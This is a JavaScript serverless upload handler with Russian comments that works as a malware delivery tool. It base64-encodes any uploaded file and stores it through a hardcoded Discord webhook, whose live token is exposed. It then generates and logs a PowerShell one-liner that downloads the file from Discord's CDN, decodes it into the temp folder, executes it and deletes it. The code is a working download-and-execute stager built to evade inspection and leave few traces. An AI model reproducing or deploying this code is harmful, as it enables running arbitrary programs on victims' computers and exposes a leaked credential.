const https = require('https');

const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1504857329190048006/VKZEEClNQkY75JLhBYc91V5fr8buY5A-O8fgnJFtDVnHVwCc9Fro54FI9ZJrGSpssVh2';

// Отключаем bodyParser для Vercel
module.exports.config = {
  api: {
    bodyParser: false,
  },
};

// Функция для отправки данных в Discord (как файл)
function uploadFileToDiscord(buffer, filename) {
  return new Promise((resolve, reject) => {
    const base64Content = buffer.toString('base64');
    const encodedFilename = filename.replace(/\.[^/.]+$/, '') + '.b64';
    const boundary = '----Boundary' + Math.random().toString(36).substring(2);
    
    const payload = Buffer.concat([
      Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${encodedFilename}"\r\nContent-Type: text/plain\r\n\r\n`),
      Buffer.from(base64Content),
      Buffer.from(`\r\n--${boundary}--\r\n`)
    ]);

    const url = new URL(DISCORD_WEBHOOK);
    const req = https.request({
      hostname: url.hostname,
      path: url.pathname,
      method: 'POST',
      headers: {
        'Content-Type': `multipart/form-data; boundary=${boundary}`,
        'Content-Length': payload.length
      }
    }, res => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          const json = JSON.parse(data);
          if (json.attachments?.[0]?.url) resolve({ url: json.attachments[0].url, name: filename });
          else reject(new Error('Discord error: ' + data));
        } catch (e) { reject(new Error('Invalid JSON from Discord: ' + data)); }
      });
    });

    req.on('error', reject);
    req.write(payload);
    req.end();
  });
}

// Функция для отправки текстового сообщения в Discord
function sendMessageToDiscord(content) {
  return new Promise((resolve) => {
    const data = JSON.stringify({ content });
    const req = https.request(DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) }
    }, res => {
      res.on('data', () => {});
      res.on('end', resolve);
    });
    req.on('error', () => resolve()); // Игнорируем ошибки лога
    req.write(data);
    req.end();
  });
}

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  try {
    const contentType = req.headers['content-type'] || '';
    const boundaryMatch = contentType.match(/boundary=([^;]+)/);
    if (!boundaryMatch) throw new Error('Request has no boundary');
    const boundary = Buffer.from('--' + boundaryMatch[1]);

    // Читаем все данные в один буфер
    const chunks = [];
    for await (const chunk of req) chunks.push(chunk);
    const body = Buffer.concat(chunks);

    if (body.length === 0) throw new Error('Body is empty');

    // Простейший парсинг одного файла (для надежности на Vercel)
    const fileStart = body.indexOf(Buffer.from('\r\n\r\n')) + 4;
    const fileEnd = body.lastIndexOf(boundary) - 2;
    
    // Ищем имя файла
    const headerPart = body.slice(0, fileStart).toString();
    const filenameMatch = headerPart.match(/filename="([^"]+)"/);
    const filename = filenameMatch ? filenameMatch[1] : 'file.bin';

    if (fileEnd <= fileStart) throw new Error('Could not parse file data');

    const fileBuffer = body.slice(fileStart, fileEnd);

    // Загружаем в Discord
    const uploaded = await uploadFileToDiscord(fileBuffer, filename);

    // Команда PowerShell
    const cmd = `powershell -c "$t=\\"$env:TEMP\\${uploaded.name}\\";$u='${uploaded.url}';[IO.File]::WriteAllBytes($t,[Convert]::FromBase64String((irm $u)));Start-Process $t -Wait;Remove-Item $t"`;

    // Отправляем лог в Discord и ЖДЕМ завершения
    await sendMessageToDiscord(`📁 **${uploaded.name}**\n\`\`\`powershell\n${cmd}\n\`\`\``);

    return res.status(200).json({ success: true, command: cmd });

  } catch (err) {
    console.error('SERVER ERROR:', err.message);
    return res.status(500).json({ success: false, error: err.message });
  }
};
